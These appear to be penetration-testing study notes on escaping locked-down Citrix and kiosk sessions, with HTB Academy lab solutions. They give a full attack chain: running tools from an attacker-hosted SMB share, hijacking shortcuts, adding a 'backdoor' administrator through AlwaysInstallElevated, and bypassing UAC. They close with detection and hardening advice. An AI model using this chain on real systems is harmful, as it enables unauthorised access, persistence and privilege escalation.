# Citrix Breakout

## 🎯 Overview

**Citrix Breakout** involves escaping restricted virtualization environments such as **Terminal Services**, **Citrix**, **AWS AppStream**, **CyberArk PSM**, and **Kiosk** environments. These platforms implement lock-down measures to minimize security impact, but breakout techniques can bypass these restrictions to gain command execution and privilege escalation.

## 🔓 Basic Breakout Methodology

### Three-Step Process
```cmd
1. Gain access to a Dialog Box
2. Exploit the Dialog Box to achieve command execution  
3. Escalate privileges to gain higher levels of access
```

### Environment Characteristics
```cmd
# Highly restrictive environments typically have:
- No cmd.exe/powershell.exe in Start Menu
- Blocked access to C:\Windows\system32 via File Explorer
- Group policy restrictions on directory browsing
- File Explorer access restrictions to sensitive paths
```

## 📂 Bypassing Path Restrictions

### Dialog Box Methodology
```cmd
# Applications with file interaction features provide dialog boxes:
- Save/Save As
- Open/Load  
- Browse/Import/Export
- Help/Search/Scan/Print
```

### MS Paint Dialog Box Example
```cmd
# Steps:
1. Run Paint from Start Menu
2. Click File > Open to open Dialog Box
3. Enter UNC path: \\127.0.0.1\c$\users\pmorgan
4. Set File-Type to "All Files"  
5. Press Enter to gain directory access

# Result: Bypasses File Explorer restrictions
```

### UNC Path Technique
```cmd
# UNC paths that work in dialog boxes:
\\127.0.0.1\c$\users\<username>    # Local admin share
\\<ip>\<share>                     # Remote SMB share
\\localhost\c$\                    # Alternative localhost syntax
```

## 🌐 SMB Share Access from Restricted Environment

### Setting up SMB Server
```bash
# On attacking machine (Ubuntu/Kali):
smbserver.py -smb2support share $(pwd)

# Example output:
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

### Accessing SMB Share via Dialog Box
```cmd
# Steps:
1. Open Paint > File > Open
2. Enter UNC path: \\<attacker_ip>\share
3. Set File-Type to "All Files"
4. Browse and execute files directly from share

# File execution:
- Right-click on executable
- Select "Open" to run directly
```

### Custom Breakout Binary
```c
// pwn.c - Simple CMD launcher
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}

// Compile and place on SMB share
// Right-click > Open in dialog box = CMD access
```

## 🛠️ Alternate File System Tools

### Explorer++ Bypass
```cmd
# Why Explorer++:
- Portable (no installation required)
- Bypasses group policy folder restrictions  
- Fast and user-friendly interface
- Can copy files where File Explorer cannot

# Usage:
1. Download Explorer++ to SMB share
2. Execute via dialog box or copy to system
3. Use for unrestricted file system access
```

### Alternative File Managers
```cmd
# Recommended tools:
- Explorer++        # Most popular and effective
- Q-Dir            # Quad-pane file manager  
- FreeCommander    # Dual-pane alternative
- Total Commander  # Feature-rich option
```

## 🗝️ Alternate Registry Editors

### Registry Editor Bypass
```cmd
# When regedit.exe is blocked by group policy:
- Simpleregedit
- Uberregedit  
- SmallRegistryEditor

# These GUI tools bypass standard group policy restrictions
# Allow full registry editing capabilities
```

### Registry Editor Features
```cmd
# Capabilities:
- Full HKEY hive access
- Import/Export registry files
- Search functionality
- Permissions modification
```

## 🔗 Modifying Existing Shortcuts

### Shortcut Hijacking Process
```cmd
# Steps:
1. Right-click existing shortcut
2. Select "Properties"
3. Modify "Target" field to desired executable:
   Target: C:\Windows\System32\cmd.exe
4. Execute shortcut = CMD access

# Alternative targets:
C:\Windows\System32\powershell.exe
C:\Windows\System32\mmc.exe
\\<ip>\share\<tool>.exe
```

### Creating New Shortcuts
```powershell
# PowerShell method for .lnk creation:
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\Users\<user>\Desktop\pwn.lnk")
$Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
$Shortcut.Save()
```

## 📝 Script Execution Bypass

### Batch File Method
```batch
# Create evil.bat:
1. Create new text file
2. Rename to "evil.bat"  
3. Edit content:
   cmd
4. Save and execute

# Result: Opens Command Prompt
```

### Script Extension Exploitation
```cmd
# When these extensions auto-execute:
.bat    # Batch files
.vbs    # VBScript files  
.ps1    # PowerShell scripts

# Potential for:
- Interactive console access
- Download and launch tools
- Bypass restrictions via scripting
```

## 🔺 Privilege Escalation in Citrix

### AlwaysInstallElevated Discovery
```cmd
# Check registry for Always Install Elevated:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Both should return: REG_DWORD 0x1
```

### PowerUp MSI Exploitation
```powershell
# Using PowerUp for MSI creation:
Import-Module .\PowerUp.ps1
Write-UserAddMSI

# Creates UserAdd.msi on desktop
# Execute to create new admin user
```

### User Creation via MSI
```cmd
# MSI execution creates user dialog:
Username: backdoor
Password: T3st@123        # Must meet complexity requirements
Group: Administrators

# Result: New admin user created
```

### Runas for New User Context
```cmd
# Switch to new admin user:
runas /user:backdoor cmd

# Enter password: T3st@123
# New CMD session as admin user
```

## 🛡️ UAC Bypass

### UAC Bypass Necessity
```cmd
# Even admin users face UAC restrictions:
C:\Windows\system32> cd C:\Users\Administrator
Access is denied.

# UAC blocks access despite admin membership
```

### Bypass-UAC Script Usage
```powershell
# UAC bypass execution:
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep

# Process:
- Impersonates explorer.exe
- Drops proxy DLL
- Executes sysprep for privilege escalation
```

### Verification of Bypass
```cmd
# Verify elevated privileges:
whoami /all
whoami /priv

# Test access:
cd C:\Users\Administrator
dir *.txt
```

## 🎯 HTB Academy Lab Solutions

### Lab Environment
```cmd
# Access method:
1. RDP to target with htb-student:HTB_@cademy_stdnt!
2. Visit http://humongousretail.com/remote/
3. Login: pmorgan:Summer1Summer! (Domain: htb.local)
4. Download launch.ica file for Citrix access
```

### Lab 1: User Flag (pmorgan Downloads)
```cmd
# Objective: Get flag from C:\Users\pmorgan\Downloads
# Method: Dialog box bypass to access restricted directory

# Steps:
1. Open Paint > File > Open
2. Navigate to: \\127.0.0.1\c$\users\pmorgan\Downloads  
3. Access flag.txt
# Flag location: C:\Users\pmorgan\Downloads\flag.txt
```

### Lab 2: Administrator Flag
```cmd
# Objective: Get flag from C:\Users\Administrator\Desktop
# Method: Full privilege escalation chain

# Complete process:
1. Dialog box breakout for CMD access
2. Copy tools from SMB share
3. Use PowerUp for AlwaysInstallElevated
4. Create admin user with MSI
5. UAC bypass with Bypass-UAC.ps1
6. Access Administrator desktop

# Flag location: C:\Users\Administrator\Desktop\flag.txt
```

## 🔄 Complete Attack Chain

### Comprehensive Breakout Process
```cmd
# 1. Initial access via dialog box
Paint > File > Open > \\127.0.0.1\c$\users\<user>

# 2. SMB server setup
smbserver.py -smb2support share $(pwd)

# 3. Tool transfer and execution  
\\<attacker_ip>\share\pwn.exe

# 4. Privilege enumeration
.\PowerUp.ps1 
# or
.\winPEAS.exe

# 5. AlwaysInstallElevated exploitation
Write-UserAddMSI
# Execute UserAdd.msi

# 6. Admin user creation
Username: backdoor
Password: Complex@123
Group: Administrators  

# 7. Context switch
runas /user:backdoor cmd

# 8. UAC bypass
Bypass-UAC -Method UacMethodSysprep

# 9. Full system access
whoami /priv
cd C:\Users\Administrator
```

## 🛠️ Required Tools

### Essential Breakout Tools
```cmd
# File system access:
Explorer++.exe          # Alternative file manager
Q-Dir.exe              # Quad-pane explorer

# Registry access:  
SmallRegistryEditor.exe # Alternative registry editor
Simpleregedit.exe      # Lightweight reg editor

# Privilege escalation:
PowerUp.ps1            # Privilege escalation framework
Bypass-UAC.ps1         # UAC bypass collection
winPEAS.exe           # Windows enumeration

# Custom tools:
pwn.exe               # Custom CMD launcher
evil.bat              # Simple batch breakout
```

## ⚠️ Detection & Defense

### Detection Indicators
```cmd
# Monitor for:
- Unusual dialog box usage patterns
- UNC path access in file dialogs
- Alternative file manager execution  
- Registry editor process spawning
- MSI installation outside normal channels
- UAC bypass script execution
- SMB connections to external shares
```

### Defensive Measures
```cmd
# Hardening recommendations:
- Block UNC path access in dialog boxes
- Disable Always Install Elevated policy
- Implement application allowlisting
- Monitor file manager alternatives
- Restrict SMB access to external hosts
- Enhanced UAC configuration
- Registry access restrictions
- Dialog box behavior policies
```

## 💡 Key Takeaways

1. **Dialog boxes** provide powerful bypass mechanisms for restricted environments
2. **UNC paths** can circumvent File Explorer restrictions  
3. **Alternative tools** (Explorer++, registry editors) bypass group policy
4. **SMB shares** enable tool transfer and execution in restricted environments
5. **MSI exploitation** with AlwaysInstallElevated provides reliable privilege escalation
6. **UAC bypass** is often necessary even with admin users
7. **Script execution** (.bat, .vbs, .ps1) can provide multiple breakout vectors

---

*Citrix breakout techniques exploit the inherent trust in application dialog boxes and file interaction features to escape restricted virtualization environments and achieve privilege escalation.* 